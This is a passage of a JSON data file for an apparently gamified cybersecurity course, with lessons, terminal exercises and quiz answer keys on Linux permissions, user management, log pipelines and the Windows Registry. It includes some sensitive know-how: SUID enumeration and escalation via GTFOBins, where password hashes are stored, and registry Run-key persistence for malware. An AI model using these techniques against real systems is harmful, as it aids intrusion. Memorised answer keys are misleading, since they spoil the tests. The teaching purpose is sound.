        "concept": "Every file and directory in Linux has an associated inode containing strict Discretionary Access Control (DAC) metadata.\n\nA permission string contains 10 characters, such as: -rwxr-xr--\n- Character 1: File type (- = regular file, d = directory, l = symbolic link).\n- Characters 2\u20134 (Owner / User): Permissions for the file's owner.\n- Characters 5\u20137 (Group): Permissions for members of the file's assigned group.\n- Characters 8\u201310 (Others / World): Permissions for any other user on the system.\n\nOctal Permission Representation:\nEach permission carries a numeric weight:\n- Read (r) = 4\n- Write (w) = 2\n- Execute (x) = 1\nSumming these yields an octal digit (0 to 7) for each category:\n- rwx = 4+2+1 = 7\n- r-x = 4+0+1 = 5\n- r-- = 4+0+0 = 4\nThus, chmod 755 file sets Owner=rwx (7), Group=r-x (5), Others=r-x (5).\n\nSpecial Permission Bits:\n- SUID (Set User ID, octal 4000): When set on an executable file (-rwsr-xr-x), the file executes with the permissions of the file OWNER rather than the running user (e.g., /usr/bin/passwd owned by root). If an administrative binary with SUID has vulnerabilities or arbitrary command execution (GTFOBins), unprivileged users can escalate directly to root.\n- SGID (Set Group ID, octal 2000): Executable runs with group privileges; on directories, newly created files inherit the parent directory's group.\n- Sticky Bit (octal 1000): Set on /tmp (drwxrwxrwt); prevents users from deleting or renaming files owned by others.",
        "whyItMatters": "Misconfigured SUID binaries are among the most common privilege escalation vectors discovered during Linux penetration testing.",
        "examples": [
          "chmod 700 id_rsa: Grants read/write/execute strictly to owner, zero access to group/others.",
          "find / -perm -4000 -type f 2>/dev/null: Enumerates all SUID executables across the entire filesystem."
        ],
        "commands": [
          {
            "cmd": "ls -l /usr/bin/passwd",
            "desc": "Inspect permissions of standard root SUID binary"
          },
          {
            "cmd": "chmod 750 script.sh",
            "desc": "Set Owner=rwx (7), Group=r-x (5), Others=--- (0)"
          }
        ],
        "exercise": {
          "prompt": "Inspect the permissions and sticky bit of the /tmp directory using 'ls -ld /tmp':",
          "command": "ls -ld /tmp",
          "expectedOutput": "drwxrwxrwt 14 root root 4096 Nov 19 03:00 /tmp"
        },
        "reviewSummary": {
          "coreTakeaway": "Permissions control access using octal math (r=4, w=2, x=1); SUID binaries execute with owner privileges and require careful auditing.",
          "learningOutcome": "Mastered Linux permission structures, octal calculations, and SUID security analysis."
        }
      },
      {
        "id": "ps-task-04-03",
        "taskNumber": 3,
        "title": "Linux User and Group Management",
        "objectives": [
          "Interpret account entries in /etc/passwd and /etc/shadow",
          "Use useradd, usermod, and group management commands",
          "Manage file ownership with chown and chgrp"
        ],
        "concept": "Multi-user security in Linux isolates processes by assigning ownership to distinct User IDs (UIDs) and Group IDs (GIDs).\n\nKey Identity Files:\n1. /etc/passwd: World-readable list of user accounts formatted as 7 colon-separated fields:\n   username:x:UID:GID:comment:home_directory:login_shell\n   (e.g., root:x:0:0:root:/root:/bin/bash). UID 0 is the root superuser.\n2. /etc/shadow: Restricted file readable ONLY by root (permissions 640 or 600). Stores password hashes (e.g. SHA-512 $6$...) and password aging metadata.\n3. /etc/group: Lists group names, GIDs, and member user accounts.\n\nUser & Group Administration Commands:\n- useradd -m -s /bin/bash cadet: Creates a new user with home directory and login shell.\n- usermod -aG sudo cadet: Appends user 'cadet' to the 'sudo' administrative group.\n- id: Displays current user's UID, GID, and active secondary groups.\n- chown user:group filename: Changes both owner and group of a file.",
        "whyItMatters": "Auditing /etc/passwd for unauthorized accounts with UID 0 (backdoors) and auditing sudo group membership is fundamental to Linux system defense.",
        "examples": [
          "UID 0 check: awk -F: '($3 == 0) {print $1}' /etc/passwd identifies all accounts with full root privileges.",
          "Changing ownership: chown root:root /etc/shadow ensures non-root users cannot read password hashes."
        ],
        "commands": [
          {
            "cmd": "id",
            "desc": "Print current real and effective user ID and group IDs"
          },
          {
            "cmd": "groups",
            "desc": "Print all group memberships for the current user session"
          }
        ],
        "exercise": {
          "prompt": "Inspect the root user entry in /etc/passwd using 'grep root /etc/passwd | head -n 1':",
          "command": "grep root /etc/passwd | head -n 1",
          "expectedOutput": "root:x:0:0:root:/root:/bin/bash"
        },
        "reviewSummary": {
          "coreTakeaway": "User identities are tracked by UID/GID; /etc/shadow protects password hashes while /etc/passwd defines accounts.",
          "learningOutcome": "Mastered Linux user administration, group management, and account auditing."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-04-01",
        "taskId": "ps-task-04-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which virtual pseudo-filesystem directory in Linux exposes real-time kernel memory and process info?",
        "canonicalAnswer": "/proc",
        "acceptedAnswers": [
          "/proc",
          "proc",
          "/proc/"
        ],
        "visualSlots": "/ _ _ _ _",
        "answerLength": 5,
        "hints": [
          "It contains directories named after running process IDs (PIDs).",
          "Short for processes."
        ],
        "hint": "Virtual pseudo-filesystem for processes...",
        "explanation": "/proc is a synthetic filesystem created by the kernel dynamically to expose real-time hardware, driver, and per-process operational state.",
        "xp": 25
      },
      {
        "id": "ps-q-04-02",
        "taskId": "ps-task-04-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "What 3-digit octal permission value grants full read/write/execute (7) to the file owner, and read/execute (5) to group and others?",
        "canonicalAnswer": "755",
        "acceptedAnswers": [
          "755"
        ],
        "visualSlots": "_ _ _",
        "answerLength": 3,
        "hints": [
          "Owner gets 4+2+1=7; group gets 4+1=5; others get 4+1=5.",
          "Three digits."
        ],
        "hint": "Combine 7, 5, and 5...",
        "explanation": "chmod 755 grants rwxr-xr-x: full access to owner, read and execute access to group and world.",
        "xp": 25
      },
      {
        "id": "ps-q-04-03",
        "taskId": "ps-task-04-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "Which configuration file in Linux stores encrypted user password hashes and is readable only by the root user?",
        "canonicalAnswer": "/etc/shadow",
        "acceptedAnswers": [
          "/etc/shadow",
          "shadow",
          "/etc/shadow/"
        ],
        "visualSlots": "/ _ _ _ / _ _ _ _ _ _",
        "answerLength": 11,
        "hints": [
          "It resides in the /etc directory and is named after cast shadows.",
          "Contains salted hashes starting with $6$ or $y$."
        ],
        "hint": "Protected file in /etc containing password hashes...",
        "explanation": "/etc/shadow stores salted and hashed user passwords with strict 0640 or 0600 permissions, preventing unprivileged users from dumping hashes for offline cracking.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 04 Capstone Assessment: Linux Permission & Privilege Escalation Audit",
      "scenario": "During a security audit of a Linux production server, a junior sysadmin configured a custom backup binary with permissions: -rwsr-xr-x 1 root root 45280 /usr/local/bin/backup.sh.",
      "taskId": "ps-task-04-assessment",
      "question": {
        "id": "ps-q-04-capstone",
        "type": "exact",
        "question": "What special permission bit is indicated by the lowercase 's' in the owner permission triad (-rwsr-xr-x), which causes this script to execute with root privileges?",
        "canonicalAnswer": "suid",
        "acceptedAnswers": [
          "suid",
          "setuid",
          "SUID",
          "SETUID",
          "set user id"
        ],
        "visualSlots": "_ _ _ _",
        "answerLength": 4,
        "hints": [
          "Stands for Set User ID.",
          "4-letter acronym."
        ],
        "hint": "4-letter acronym for Set User ID...",
        "explanation": "The SUID (Set User ID) bit instructs the Linux kernel to execute the binary with the permissions of the file owner (root) rather than the invoking user.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-05",
    "legacyId": "room-05",
    "order": 5,
    "stageId": "ps-stage-02",
    "stageTitle": "Operating Systems & System Internals",
    "stageOrder": 2,
    "title": "Linux Command-Line Mastery, Text Wrangling & Pipes",
    "tagline": "Standard Streams, I/O Redirection, Pipes, Grep, System Logs & Bash Automation",
    "description": "Master command-line productivity and log analysis: standard I/O streams (stdin, stdout, stderr), pipe redirection, text wrangling (grep, awk, cut, sort, uniq), process inspection, system logs, and practical Bash scripting.",
    "difficulty": "Foundational",
    "estimatedMinutes": 40,
    "xp": 50,
    "prerequisites": [
      "ps-room-04"
    ],
    "whyAreYouHere": "Security analysts sift through gigabytes of raw server logs daily. Mastering pipes, text processing tools, and Bash automation enables rapid triage of intrusions without third-party tools.",
    "diagramSvg": "<svg viewBox=\"0 0 600 150\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"15\" y=\"45\" width=\"130\" height=\"60\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"80\" y=\"72\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">cat /var/log/auth</text><text x=\"80\" y=\"92\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Stdout (FD 1)</text><line x1=\"145\" y1=\"75\" x2=\"185\" y2=\"75\" stroke=\"#00f0ff\" stroke-width=\"2\"/><polygon points=\"185,72 191,75 185,78\" fill=\"#00f0ff\"/><rect x=\"191\" y=\"45\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#1e293b\" stroke=\"#6366f1\" stroke-width=\"2\"/><text x=\"246\" y=\"72\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">grep \"Failed\"</text><text x=\"246\" y=\"92\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Filter Lines</text><line x1=\"301\" y1=\"75\" x2=\"341\" y2=\"75\" stroke=\"#a855f7\" stroke-width=\"2\"/><polygon points=\"341,72 347,75 341,78\" fill=\"#a855f7\"/><rect x=\"347\" y=\"45\" width=\"110\" height=\"60\" rx=\"8\" fill=\"#1e293b\" stroke=\"#a855f7\" stroke-width=\"2\"/><text x=\"402\" y=\"72\" fill=\"#c084fc\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">awk '{print $11}'</text><text x=\"402\" y=\"92\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Extract IP</text><line x1=\"457\" y1=\"75\" x2=\"497\" y2=\"75\" stroke=\"#10b981\" stroke-width=\"2\"/><polygon points=\"497,72 503,75 497,78\" fill=\"#10b981\"/><rect x=\"503\" y=\"45\" width=\"85\" height=\"60\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"545\" y=\"72\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"11\" font-weight=\"bold\" text-anchor=\"middle\">sort | uniq</text><text x=\"545\" y=\"92\" fill=\"#94a3b8\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">Count</text></svg>",
    "tryInteractive": {
      "expectedCommand": "echo 'Failed login from 192.168.1.5' | awk '{print $4}'",
      "simulatedOutput": "192.168.1.5"
    },
    "terminalCommands": [
      {
        "command": "echo 'Failed login from 192.168.1.5' | awk '{print $4}'",
        "output": "192.168.1.5"
      },
      {
        "command": "ps aux | grep -v grep | head -n 4",
        "output": "USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nroot           1  0.0  0.1 167924 11244 ?        Ss   00:00   0:01 /sbin/init\nroot           2  0.0  0.0      0     0 ?        S    00:00   0:00 [kthreadd]\nroot         582  0.0  0.2  73520 18420 ?        Ss   00:00   0:00 /usr/sbin/sshd -D"
      },
      {
        "command": "systemctl is-active sshd",
        "output": "active"
      }
    ],
    "objectives": [
      "Control standard streams (stdin, stdout, stderr) and file redirection operators",
      "Construct multi-stage command pipelines using grep, cut, awk, sort, and uniq",
      "Monitor Linux processes and inspect system logs (/var/log/auth.log, syslog)",
      "Write basic Bash automation scripts using shebangs, variables, and conditional loops"
    ],
    "lessons": [
      {
        "id": "ps-task-05-01",
        "taskNumber": 1,
        "title": "Standard Streams & I/O Redirection",
        "objectives": [
          "Identify the three standard POSIX I/O streams and their integer file descriptors",
          "Use redirection operators (>, >>, <, 2>, 2>&1) to manage file output",
          "Connect commands using the pipe operator (|)"
        ],
        "concept": "Under the Unix philosophy, programs receive input as streams of text and produce output as streams of text. Every Linux process starts with three default POSIX standard file descriptors (FDs):\n- Standard Input (stdin, FD 0): Stream providing input to the process (default: keyboard).\n- Standard Output (stdout, FD 1): Stream carrying regular program output (default: terminal screen).\n- Standard Error (stderr, FD 2): Stream carrying diagnostic error messages (default: terminal screen).\n\nRedirection Operators:\n- > file: Overwrites file with stdout (e.g. echo 'admin' > users.txt).\n- >> file: Appends stdout to the end of file without truncating.\n- 2> file: Redirects only stderr errors to a file (e.g. 2>/dev/null discards errors).\n- 2>&1: Merges stderr into stdout so both streams can be redirected together.\n- | (Pipe): Directs the stdout of the left command directly into the stdin of the right command.",
        "whyItMatters": "Discarding permission errors (2>/dev/null) during reconnaissance allows analysts to scan the filesystem without cluttering terminal output with thousands of 'Access Denied' warnings.",
        "examples": [
          "find / -name '*.conf' 2>/dev/null: Finds configuration files, discarding access errors.",
          "command >> audit.log 2>&1: Appends both regular output and errors to a persistent log file."
        ],
        "commands": [
          {
            "cmd": "echo 'CALION' > test.txt",
            "desc": "Write text into a file, overwriting existing content"
          },
          {
            "cmd": "cat /nonexistent 2>/dev/null",
            "desc": "Suppress stderr error output by redirecting file descriptor 2 to the null device"
          }
        ],
        "exercise": {
          "prompt": "Redirect error output of an invalid command to /dev/null using 'ls /root 2>/dev/null':",
          "command": "ls /root 2>/dev/null",
          "expectedOutput": ""
        },
        "reviewSummary": {
          "coreTakeaway": "Standard streams (FD 0=stdin, 1=stdout, 2=stderr) enable powerful pipeline chaining and clean error suppression.",
          "learningOutcome": "Mastered standard I/O redirection and stream piping."
        }
      },
      {
        "id": "ps-task-05-02",
        "taskNumber": 2,
        "title": "Log Analysis & Text Processing Utilities",
        "objectives": [
          "Filter log files with grep using flags -i (ignore case), -v (invert), and -c (count)",
          "Extract columns from structured data using cut and awk",
          "Deduplicate and rank frequency of events using sort and uniq -c"
        ],
        "concept": "Security analysts frequently analyze gigabytes of plaintext web, authentication, and firewall logs. Five primary utilities form the backbone of command-line log wrangling:\n\n1. grep (Global Regular Expression Print): Pattern matching filter.\n   - grep -i 'error' app.log: Case-insensitive search.\n   - grep -v '127.0.0.1' access.log: Inverts match (excludes localhost traffic).\n   - grep -E '([0-9]{1,3}\\.){3}[0-9]{1,3}' log: Matches IPv4 addresses with extended regex.\n\n2. cut: Splits lines by a delimiter character:\n   - cut -d ':' -f 1 /etc/passwd: Extracts the first column (usernames) delimited by colons.\n\n3. awk: A powerful pattern-scanning language. Treats lines as whitespace-delimited fields by default ($1, $2, ...):\n   - awk '{print $1, $9}' access.log: Prints client IP ($1) and HTTP status code ($9).\n\n4. sort & uniq: Aggregates duplicate data.\n   - uniq ONLY removes adjacent duplicates, so data MUST be sorted first: sort | uniq -c | sort -nr (sorts, counts occurrences, and ranks highest frequencies first).",
        "whyItMatters": "A SOC analyst can construct a one-line command to identify the top 10 IP addresses conducting password spraying against an SSH server in seconds.",
        "examples": [
          "Top Offending IPs: grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 10."
        ],
        "commands": [
          {
            "cmd": "cat /etc/passwd | cut -d: -f1,7",
            "desc": "Print usernames and their default login shells"
          },
          {
            "cmd": "echo -e 'apple\\nbanana\\napple' | sort | uniq -c",
            "desc": "Deduplicate and count item frequencies"
          }
        ],
        "exercise": {
          "prompt": "Extract the IP address from a simulated log line using 'echo \"Failed from 10.0.0.99 port 22\" | awk \"{print \\$3}\"':",
          "command": "echo 'Failed from 10.0.0.99 port 22' | awk '{print $3}'",
          "expectedOutput": "10.0.0.99"
        },
        "reviewSummary": {
          "coreTakeaway": "Pipelines combining grep, awk, sort, and uniq convert massive raw text files into actionable security intelligence.",
          "learningOutcome": "Mastered CLI text processing and log analysis pipelines."
        }
      },
      {
        "id": "ps-task-05-03",
        "taskNumber": 3,
        "title": "Linux Processes, Services & System Logs",
        "objectives": [
          "Inspect active processes using ps aux and top",
          "Manage system daemons using systemctl (status, start, stop, enable)",
          "Analyze authentication and system events in /var/log/auth.log and /var/log/syslog"
        ],
        "concept": "A process is an instance of a running program in memory with its own PID, memory address space, and environment variables. Processes that run continuously in the background without a controlling terminal are known as Daemons or Services.\n\nProcess Inspection:\n- ps aux: Displays a snapshot of all running processes across all users (a = all users, u = display user/owner, x = include processes without a tty).\n- top / htop: Interactive real-time process viewer showing CPU and RAM consumption.\n\nService Management (systemd):\nModern Linux distributions use systemd as the init system (PID 1):\n- systemctl status sshd: Checks if the SSH daemon is active and running.\n- systemctl restart nginx: Restarts web server service.\n- systemctl enable service: Configures service to launch automatically upon boot.\n\nSystem Logs:\n- /var/log/auth.log (Debian/Ubuntu) or /var/log/secure (RHEL/CentOS): Records user logins, failed password attempts, and sudo command invocations.\n- /var/log/syslog (or /var/log/messages): General system message log.",
        "whyItMatters": "Detecting unauthorized background processes (cryptominers, reverse shells) and auditing failed login bursts in auth.log is standard threat hunting.",
        "examples": [
          "Hunting suspicious processes: ps aux | grep -i 'miner' or checking for high-CPU binaries in /tmp.",
          "Auditing sudo: grep 'COMMAND=' /var/log/auth.log reveals all commands executed with elevated root privileges."
        ],
        "commands": [
          {
            "cmd": "ps aux | grep sshd",
            "desc": "Check if SSH server process is actively running"
          },
          {
            "cmd": "systemctl is-active sshd",
            "desc": "Return single-word status of SSH daemon"
          }
        ],
        "exercise": {
          "prompt": "Check if the SSH service is active using 'systemctl is-active sshd':",
          "command": "systemctl is-active sshd",
          "expectedOutput": "active"
        },
        "reviewSummary": {
          "coreTakeaway": "Processes and services are monitored via ps/systemctl; /var/log/auth.log provides the authoritative record of logon activity.",
          "learningOutcome": "Mastered Linux process auditing, systemd service management, and authentication log analysis."
        }
      },
      {
        "id": "ps-task-05-04",
        "taskNumber": 4,
        "title": "Practical Bash Scripting & Administration Automation",
        "objectives": [
          "Structure a POSIX Bash script with shebang (#!/bin/bash) and executable permissions",
          "Use script variables, positional parameters ($1, $2), and exit codes ($?)",
          "Implement loops and conditionals to automate repetitive security checks"
        ],
        "concept": "Bash (Bourne Again SHell) scripting allows security engineers to chain multiple system commands together into executable automation routines.\n\nScript Anatomy:\n1. Shebang (#!/bin/bash): Tells the OS kernel which interpreter to use when executing the file.\n2. Executable Permission: The script must have execute permissions: chmod +x script.sh.\n\nCore Bash Constructs:\n- Variables: TARGET='192.168.1.1' (no spaces around =). Referenced as $TARGET.\n- Positional Parameters: $1 represents the first command-line argument passed to the script, $# is the count of arguments, and $? is the exit status of the previous command (0 = success, non-zero = error).\n- Conditionals:\n  if [ -f \"/etc/shadow\" ]; then\n      echo \"Shadow file exists\"\n  fi\n- Loops:\n  for ip in $(cat ip_list.txt); do\n      ping -c 1 $ip >/dev/null 2>&1 && echo \"$ip is UP\"\n  done",
        "whyItMatters": "Security analysts use Bash scripts to automate daily operational tasks: rotating logs, scanning subnets, verifying file integrity checksums, and backing up configurations.",
        "examples": [
          "Ping Sweeper: Iterating through IPs 1 to 254 to discover live hosts on a subnet.",
          "Integrity Checker: A daily cron script checking if critical system binaries in /bin have been modified."
        ],
        "commands": [
          {
            "cmd": "bash -c 'for i in 1 2 3; do echo \"Check $i passed\"; done'",
            "desc": "Run an inline Bash for loop"
          },
          {
            "cmd": "echo $?",
            "desc": "Print the exit code status of the most recent command"
          }
        ],
        "exercise": {
          "prompt": "Run an inline Bash loop to print three test audit iterations:",
          "command": "bash -c 'for i in 1 2 3; do echo \"Audit $i\"; done'",
          "expectedOutput": "Audit 1\nAudit 2\nAudit 3"
        },
        "reviewSummary": {
          "coreTakeaway": "Bash scripts automate administrative workflows by combining commands with variables, arguments, conditionals, and loops.",
          "learningOutcome": "Mastered basic Bash scripting and automated security task execution."
        }
      }
    ],
    "questions": [
      {
        "id": "ps-q-05-01",
        "taskId": "ps-task-05-01",
        "taskIndex": 0,
        "type": "exact",
        "question": "Which standard POSIX file descriptor integer represents standard error (stderr)?",
        "canonicalAnswer": "2",
        "acceptedAnswers": [
          "2",
          "two"
        ],
        "visualSlots": "_",
        "answerLength": 1,
        "hints": [
          "0 is stdin, 1 is stdout, and ... is stderr.",
          "A single digit."
        ],
        "hint": "Single digit for stderr...",
        "explanation": "Standard error is assigned file descriptor 2. 2> redirects error streams independently from stdout (1).",
        "xp": 25
      },
      {
        "id": "ps-q-05-02",
        "taskId": "ps-task-05-02",
        "taskIndex": 1,
        "type": "exact",
        "question": "What grep command-line flag inverts matching to output only lines that do NOT match the specified pattern?",
        "canonicalAnswer": "-v",
        "acceptedAnswers": [
          "-v",
          "--invert-match",
          "v"
        ],
        "visualSlots": "- _",
        "answerLength": 2,
        "hints": [
          "A short flag beginning with a hyphen.",
          "Starts with -v (invert)."
        ],
        "hint": "Hyphen followed by letter v...",
        "explanation": "The -v (--invert-match) flag in grep selects non-matching lines, commonly used to filter out noise or localhost entries from logs.",
        "xp": 25
      },
      {
        "id": "ps-q-05-03",
        "taskId": "ps-task-05-03",
        "taskIndex": 2,
        "type": "exact",
        "question": "On Debian and Ubuntu Linux systems, which log file records SSH authentication attempts and sudo privilege escalations?",
        "canonicalAnswer": "auth.log",
        "acceptedAnswers": [
          "auth.log",
          "/var/log/auth.log",
          "auth"
        ],
        "visualSlots": "_ _ _ _ . _ _ _",
        "answerLength": 8,
        "hints": [
          "It resides in /var/log/ and has a .log extension.",
          "Short for authentication log."
        ],
        "hint": "auth.log in /var/log...",
        "explanation": "/var/log/auth.log records all authentication events including interactive SSH logons, failed login attempts, and sudo command invocations.",
        "xp": 25
      },
      {
        "id": "ps-q-05-04",
        "taskId": "ps-task-05-04",
        "taskIndex": 3,
        "type": "exact",
        "question": "In a Bash script, which special variable holds the numeric exit status of the most recently executed command?",
        "canonicalAnswer": "$?",
        "acceptedAnswers": [
          "$?",
          "?",
          "$?"
        ],
        "visualSlots": "$ ?",
        "answerLength": 2,
        "hints": [
          "Begins with a dollar sign followed by a question mark.",
          "Evaluates to 0 on success and non-zero on error."
        ],
        "hint": "Dollar sign and question mark...",
        "explanation": "$? holds the exit code of the last command executed; by convention, 0 denotes success and any positive integer (1-255) indicates an error.",
        "xp": 25
      }
    ],
    "finalAssessment": {
      "title": "Room 05 Capstone Assessment: Incident Response Log Pipeline Synthesis",
      "scenario": "A web application server is under an active credential stuffing brute force attack. The security analyst must quickly identify which external IP address generated the highest number of failed authentication attempts.",
      "taskId": "ps-task-05-assessment",
      "question": {
        "id": "ps-q-05-capstone",
        "type": "choice",
        "question": "Which command pipeline correctly extracts failed login lines, isolates the IP column (field 11), counts occurrences, and ranks the top offender at the top of the list?",
        "options": [
          "grep 'Failed password' /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr | head -n 1",
          "cat /var/log/auth.log | grep -v 'Failed' | cut -d ' ' -f 1",
          "tail -f /var/log/auth.log | sort | uniq",
          "awk '{print $1}' /var/log/auth.log | grep 200"
        ],
        "correctIndex": 0,
        "hints": [
          "Remember that uniq -c requires sorted input, and sort -nr sorts numerically in descending order.",
          "Look for the pipeline that filters 'Failed password' and extracts field 11."
        ],
        "hint": "Pipeline with grep 'Failed password', awk, sort, uniq -c, and sort -nr...",
        "explanation": "Filtering for 'Failed password', extracting field $11 with awk, sorting, counting unique occurrences with uniq -c, and sorting descending with sort -nr isolates the top offending IP address.",
        "xp": 25
      }
    }
  },
  {
    "id": "ps-room-06",
    "legacyId": "room-06",
    "order": 6,
    "stageId": "ps-stage-02",
    "stageTitle": "Operating Systems & System Internals",
    "stageOrder": 2,
    "title": "Windows Architecture, Registry & Access Control",
    "tagline": "Windows NT Kernel, Registry Hives, SIDs, DACLs, PowerShell & Event Logs",
    "description": "Understand enterprise Windows architecture: the Windows NT kernel model, Registry hives, Security Identifiers (SIDs), Access Tokens, DACLs/SACLs, Windows services, PowerShell administration, and Security Event Logs.",
    "difficulty": "Foundational",
    "estimatedMinutes": 40,
    "xp": 50,
    "prerequisites": [
      "ps-room-05"
    ],
    "whyAreYouHere": "Windows dominates enterprise corporate workstations and Active Directory networks. Understanding Windows access tokens, registry persistence, PowerShell, and Event Viewer is vital for defensive threat hunting.",
    "diagramSvg": "<svg viewBox=\"0 0 600 170\" class=\"w-full max-w-xl h-auto\" xmlns=\"http://www.w3.org/2000/svg\"><rect x=\"20\" y=\"20\" width=\"560\" height=\"60\" rx=\"8\" fill=\"#1e293b\" stroke=\"#0284c7\" stroke-width=\"2\"/><text x=\"50\" y=\"45\" fill=\"#38bdf8\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\">User Mode (Ring 3)</text><rect x=\"180\" y=\"32\" width=\"115\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"237\" y=\"54\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Explorer.exe</text><rect x=\"310\" y=\"32\" width=\"115\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#475569\"/><text x=\"367\" y=\"54\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">PowerShell.exe</text><rect x=\"440\" y=\"32\" width=\"125\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#6366f1\"/><text x=\"502\" y=\"54\" fill=\"#818cf8\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">LSASS.exe (Auth)</text><line x1=\"20\" y1=\"95\" x2=\"580\" y2=\"95\" stroke=\"#ef4444\" stroke-width=\"2\" stroke-dasharray=\"6\"/><text x=\"300\" y=\"90\" fill=\"#f87171\" font-family=\"JetBrains Mono\" font-size=\"9\" text-anchor=\"middle\">--- System Call Boundary (NTDLL.DLL) ---</text><rect x=\"20\" y=\"105\" width=\"560\" height=\"55\" rx=\"8\" fill=\"#1e293b\" stroke=\"#10b981\" stroke-width=\"2\"/><text x=\"50\" y=\"130\" fill=\"#34d399\" font-family=\"JetBrains Mono\" font-size=\"12\" font-weight=\"bold\">Kernel Mode (Ring 0)</text><rect x=\"220\" y=\"115\" width=\"150\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"295\" y=\"137\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">NTOSKRNL.EXE</text><rect x=\"385\" y=\"115\" width=\"180\" height=\"35\" rx=\"4\" fill=\"#0f172a\" stroke=\"#10b981\"/><text x=\"475\" y=\"137\" fill=\"#e2e8f0\" font-family=\"JetBrains Mono\" font-size=\"10\" text-anchor=\"middle\">Security Ref Monitor (SRM)</text></svg>",
    "tryInteractive": {
      "expectedCommand": "powershell Get-Process -Name lsass",
      "simulatedOutput": "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n   1240      34    14500      28400       2.14    684   0 lsass"
    },
    "terminalCommands": [
      {
        "command": "powershell Get-Process -Name lsass",
        "output": "Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName\n-------  ------    -----      -----     ------     --  -- -----------\n   1240      34    14500      28400       2.14    684   0 lsass"
      },
      {
        "command": "net user",
        "output": "User accounts for \\\\WIN-LAB-01\n-------------------------------------------------------------------\nAdministrator            Guest                    CadetUser\nThe command completed successfully."
      },
      {
        "command": "powershell Get-Service -Name Spooler",
        "output": "Status   Name               DisplayName\n------   ----               -----------\nRunning  Spooler            Print Spooler"
      }
    ],
    "objectives": [
      "Deconstruct the Windows NT kernel architecture and LSASS authentication",
      "Navigate Windows Registry hives (HKLM, HKCU) and locate autorun persistence keys",
      "Explain Security Identifiers (SIDs), Access Tokens, and DACLs/SACLs",
      "Use PowerShell cmdlets and analyze Windows Security Event IDs (4624, 4625, 7045)"
    ],
    "lessons": [
      {
        "id": "ps-task-06-01",
        "taskNumber": 1,
        "title": "The Windows Registry & System Configuration",
        "objectives": [
          "Explain the hierarchical database structure of the Windows Registry",
          "Distinguish between root hives: HKEY_LOCAL_MACHINE (HKLM) and HKEY_CURRENT_USER (HKCU)",
          "Identify registry autorun keys used by malware for persistence"
        ],
        "concept": "The Windows Registry is a centralized, hierarchical configuration database that stores system-wide hardware settings, OS configurations, security accounts, and per-user application preferences.\n\nRoot Registry Hives:\n- HKEY_LOCAL_MACHINE (HKLM): Configuration applicable to the physical computer and all users. Backed on disk by hive files in C:\\Windows\\System32\\config (SAM, SYSTEM, SECURITY, SOFTWARE).\n- HKEY_CURRENT_USER (HKCU): Preferences and configurations specific to the currently logged-in user. Backed on disk by C:\\Users\\[Username]\\NTUSER.DAT.\n- HKEY_CLASSES_ROOT (HKCR): File type associations and COM object registrations.\n- HKEY_USERS (HKU): Contains individual hives for all loaded user profiles.\n\nMalware Persistence in Registry:\nAdversaries establish persistence so their malware survives reboots by modifying Run keys:\n- HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (executes on startup for all users)\n- HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run (executes upon login for current user)\n- Userinit and Winlogon Shell keys.",
        "whyItMatters": "Auditing Registry Run keys is a fundamental step during digital forensics and incident response triage.",
        "examples": [
          "SAM Hive: C:\\Windows\\System32\\config\\SAM stores local password NTLM hashes.",
          "Persistence: Adding a registry value pointing to malware.exe under the Run key."
        ],
        "commands": [
          {
            "cmd": "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "desc": "Query startup persistence keys via Windows CLI"
          }
        ],
        "exercise": {
          "prompt": "Simulate inspecting the Windows local security hive directory path:",
          "command": "echo 'C:\\Windows\\System32\\config\\SAM'",
          "expectedOutput": "C:\\Windows\\System32\\config\\SAM"
        },
        "reviewSummary": {
          "coreTakeaway": "The Windows Registry centralizes OS and user settings; HKLM and HKCU Run keys are primary targets for malware persistence.",
          "learningOutcome": "Mastered Windows Registry hive structure and persistence analysis."
        }
      },
      {
        "id": "ps-task-06-02",
        "taskNumber": 2,
